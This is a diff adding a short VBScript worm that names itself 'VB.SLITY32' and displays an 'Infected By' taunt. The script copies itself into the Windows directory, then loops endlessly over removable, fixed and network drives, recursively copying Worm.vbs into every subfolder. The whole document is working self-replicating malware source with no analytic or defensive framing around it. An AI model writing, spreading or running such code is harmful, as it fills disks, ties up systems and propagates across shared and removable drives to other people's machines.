@@ -1,0 +1,35 @@
+Dim Obj
+Dim Drive
+Dim Worm,VirName
+Dim WinDir
+Dim DLetter,DriveSet
+
+Set Obj = CreateObject("Scripting.FileSystemObject") 
+Set DriveSet = CreateObject("Scripting.FileSystemObject")
+WinDir = Obj.GetSpecialFolder(0)
+Worm = "\Worm.vbs"
+VirName = WinDir & Worm
+MsgBox "Infected By VB.SLITY32..Your Antivitus Cant remove it..CHELSIE SUCKS"
+Obj.CopyFile ".\Worm.vbs" ,VirName,1
+
+do 
+For Each DLetter in DriveSet.Drives
+	If (DLetter.IsReady And (DLetter.DriveType = 1 Or DLetter.DriveType = 2 Or DLetter.DriveType = 3)) Then
+		call SearchComputer(DLetter)
+	End If
+Next
+loop while 1	
+
+
+sub SearchComputer(Fold)
+	Dim File,FSO
+	Dim temp,TempFile
+	For Each FSO in Obj.GetFolder(Fold).SubFolders
+		temp = FSO & "\*.txt"
+		File = FSO & Worm
+		Obj.CopyFile VirName ,File,1
+		On Error Resume Next
+		SearchComputer(FSO)
+	Next
+	
+End sub
